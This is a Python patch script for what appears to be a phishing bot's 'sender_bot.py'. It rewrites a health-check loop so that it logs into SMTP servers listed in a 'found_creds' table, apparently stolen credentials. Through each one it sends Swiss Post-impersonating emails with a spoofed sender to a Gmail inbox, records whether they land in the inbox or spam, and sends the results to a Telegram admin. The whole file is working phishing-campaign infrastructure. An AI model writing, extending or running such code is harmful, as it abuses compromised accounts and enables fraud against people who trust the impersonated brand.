#!/usr/bin/env python3
"""
Patch: Replace basic health check with full IMAP delivery classification.
Every 3 hours: send spoof+basique from each SMTP to Gmail checker,
check IMAP inbox/spam, update context labels.
"""

TARGET = "/opt/darkvasend/auditguard/sender_bot.py"

with open(TARGET, "r") as f:
    content = f.read()

OLD_HC = '''_health_check_task = None

async def _smtp_health_check_loop():
    import sqlite3 as _sql, smtplib, ssl
    while True:
        await asyncio.sleep(3600)
        try:
            print("[HEALTH CHECK] Starting...", flush=True)
            db = _sql.connect(DB_PATH, timeout=10)
            db.row_factory = _sql.Row
            rows = db.execute(
                "SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1"
            ).fetchall()
            checked = dead = sp_ok = bas_only = 0
            for r in rows:
                sid, host, port, user, pwd = r["id"], r["smtp_host"], r["smtp_port"], r["smtp_user"], r["smtp_password"]
                try:
                    if port == 465:
                        sctx = ssl.create_default_context()
                        sctx.check_hostname = False
                        sctx.verify_mode = ssl.CERT_NONE
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=sctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    from email.mime.text import MIMEText as _MT
                    msg = _MT("hc", "plain")
                    msg["Subject"] = "hc"
                    msg["From"] = "Post CH SA <notifications@post.ch>"
                    msg["To"] = user
                    try:
                        srv.sendmail(user, [user], msg.as_string())
                        ctx_val = r["context"] or ""
                        if "BASIQUE_" in ctx_val:
                            ctx_val = ctx_val.replace("BASIQUE_", "SPOOF_")
                            db.execute("UPDATE found_creds SET context=? WHERE id=?", (ctx_val, sid))
                        sp_ok += 1
                    except (smtplib.SMTPDataError, smtplib.SMTPSenderRefused):
                        ctx_val = r["context"] or ""
                        if "SPOOF_" in ctx_val:
                            ctx_val = ctx_val.replace("SPOOF_", "BASIQUE_")
                            db.execute("UPDATE found_creds SET context=? WHERE id=?", (ctx_val, sid))
                        bas_only += 1
                    srv.quit()
                    checked += 1
                except smtplib.SMTPAuthenticationError:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead += 1
                    checked += 1
                except Exception:
                    checked += 1
            db.commit()
            db.close()
            print("[HEALTH CHECK] " + str(checked) + " checked, " + str(dead) + " dead, " + str(sp_ok) + " spoof, " + str(bas_only) + " basique", flush=True)
        except Exception as e:
            print("[HEALTH CHECK] Error: " + str(e), flush=True)'''

NEW_HC = '''_health_check_task = None

async def _smtp_health_check_loop():
    """Full IMAP delivery check every 3h: send to Gmail checker, verify inbox/spam."""
    import sqlite3 as _sql, smtplib, ssl, uuid as _uuid
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            print("[IMAP CHECK] Starting full delivery classification...", flush=True)
            from .campaign_sender import send_clean
            from .spoof_templates import get_template
            from .imap_checker import GMAIL_CHECKER, check_gmail_delivery, is_gmail_checker_configured

            if not is_gmail_checker_configured():
                print("[IMAP CHECK] Gmail checker not configured, skipping", flush=True)
                continue

            tpl = get_template("swisspost")
            if not tpl:
                print("[IMAP CHECK] No swisspost template, skipping", flush=True)
                continue

            checker_email = GMAIL_CHECKER["email"]
            db = _sql.connect(DB_PATH, timeout=10)
            db.row_factory = _sql.Row
            rows = db.execute(
                "SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1"
            ).fetchall()

            if not rows:
                db.close()
                print("[IMAP CHECK] No SMTP to check", flush=True)
                continue

            # Phase 1: Send spoof + basique from each SMTP with markers
            markers = []  # (smtp_id, host, user, mode, marker, old_ctx)
            dead = 0
            checked = 0

            for r in rows:
                sid = r["id"]
                host, port, user, pwd = r["smtp_host"], r["smtp_port"], r["smtp_user"], r["smtp_password"]
                old_ctx = r["context"] or ""

                smtp_config = {
                    "host": host, "port": port,
                    "username": user, "password": pwd,
                    "from_email": user,
                }

                # Test AUTH first
                try:
                    if port == 465:
                        sctx = ssl.create_default_context()
                        sctx.check_hostname = False
                        sctx.verify_mode = ssl.CERT_NONE
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=sctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except smtplib.SMTPAuthenticationError:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead += 1
                    checked += 1
                    continue
                except Exception:
                    checked += 1
                    continue

                # Send SPOOF to checker
                marker_s = "HC-S-" + _uuid.uuid4().hex[:8]
                subject_s = tpl["subject"] + " [" + marker_s + "]"
                r_s = send_clean(smtp_config, tpl["from_name"], tpl["from_email"],
                                 checker_email, subject_s, tpl["html"],
                                 tpl.get("reply_to", ""), None)
                if r_s["success"]:
                    markers.append((sid, host, user, "spoof", marker_s, old_ctx))

                # Send BASIQUE to checker
                domain = user.split("@")[1] if "@" in user else host
                bas_from = "swisspost@" + domain
                marker_b = "HC-B-" + _uuid.uuid4().hex[:8]
                subject_b = tpl["subject"] + " [" + marker_b + "]"
                r_b = send_clean(smtp_config, tpl["from_name"], bas_from,
                                 checker_email, subject_b, tpl["html"],
                                 tpl.get("reply_to", ""), None)
                if r_b["success"]:
                    markers.append((sid, host, user, "basique", marker_b, old_ctx))

                checked += 1
                await asyncio.sleep(0.5)

            # Phase 2: Wait for delivery
            print("[IMAP CHECK] " + str(len(markers)) + " markers sent, waiting 30s...", flush=True)
            await asyncio.sleep(30)

            # Phase 3: Check IMAP for each marker
            results = {}  # smtp_id -> {spoof: delivery, basique: delivery}
            for sid, host, user, mode, marker, old_ctx in markers:
                delivery = check_gmail_delivery(marker, max_retries=2, retry_delay=5.0)
                if sid not in results:
                    results[sid] = {"host": host, "user": user, "old_ctx": old_ctx,
                                    "spoof": "not_sent", "basique": "not_sent"}
                results[sid][mode] = delivery

            # Phase 4: Update classifications
            si = ss = bi = bs = 0
            for sid, info in results.items():
                sp = info["spoof"]
                ba = info["basique"]
                old_ctx = info["old_ctx"]

                # Extract label suffix
                label = old_ctx.replace("Manual: ", "") if old_ctx else ""
                for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_",
                             "SPOOF_", "BASIQUE_", "STRIP_"]:
                    if label.startswith(pfx):
                        label = label[len(pfx):]
                        break

                if sp == "inbox":
                    new_ctx = "Manual: SPOOF_INBOX_" + label
                    si += 1
                elif sp == "spam":
                    new_ctx = "Manual: SPOOF_SPAM_" + label
                    ss += 1
                elif ba == "inbox":
                    new_ctx = "Manual: BASIQUE_INBOX_" + label
                    bi += 1
                elif ba == "spam":
                    new_ctx = "Manual: BASIQUE_SPAM_" + label
                    bs += 1
                else:
                    continue  # Keep old classification if nothing arrived

                db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))

            db.commit()
            db.close()
            print("[IMAP CHECK] " + str(checked) + " checked, " + str(dead) + " dead | "
                  "SI:" + str(si) + " SS:" + str(ss) + " BI:" + str(bi) + " BS:" + str(bs),
                  flush=True)

            # Notify admin
            from .db import send_telegram
            send_telegram(
                "IMAP CHECK AUTO\\n"
                "Checked: " + str(checked) + " | Dead: " + str(dead) + "\\n"
                "SPOOF INBOX: " + str(si) + "\\n"
                "SPOOF SPAM: " + str(ss) + "\\n"
                "BASIQUE INBOX: " + str(bi) + "\\n"
                "BASIQUE SPAM: " + str(bs))

        except Exception as e:
            print("[IMAP CHECK] Error: " + str(e), flush=True)'''

content = content.replace(OLD_HC, NEW_HC)

# Update post_init message
content = content.replace(
    "print('  Health check: ON (every 1h)', flush=True)",
    "print('  IMAP delivery check: ON (every 3h)', flush=True)"
)

with open(TARGET, "w") as f:
    f.write(content)

import ast
ast.parse(open(TARGET).read())
print("IMAP CHECK PATCH APPLIED + SYNTAX OK")
